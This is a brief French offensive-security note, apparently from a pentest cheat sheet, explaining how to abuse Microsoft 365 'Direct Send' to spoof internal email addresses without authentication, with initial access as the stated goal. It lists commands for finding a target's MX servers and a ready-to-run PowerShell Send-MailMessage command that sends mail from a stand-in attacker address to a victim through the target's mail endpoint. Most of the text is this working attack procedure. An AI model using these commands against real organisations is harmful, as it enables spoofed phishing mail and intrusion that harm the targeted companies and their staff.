Le **Direct Send** est une méthode d'envoi d'emails qui exploite les serveurs SMTP des domaines cibles sans passer par un serveur SMTP intermédiaire authentifié.

L'exploitation de direct send permet de spoofer très facilement une adresse mail interne à l'entreprise, sans authentification, et donc potentiellement d'obtenir facilement un accès initial.


### Trouver les serveurs MX

```bash
# Avec nslookup 
nslookup -type=MX target-domain.com 
# Avec dig (plus détaillé) 
dig MX target-domain.com 
# Avec host 
host -t MX target-domain.com
```

### Exploitation de base

```bash
Send-MailMessage -From "attacker@evil.com" ` -To "victim@target-domain.com" ` -Subject "Test Direct Send" ` -Body "Contenu du message" ` -SmtpServer "target-domain-com.mail.protection.outlook.com"
```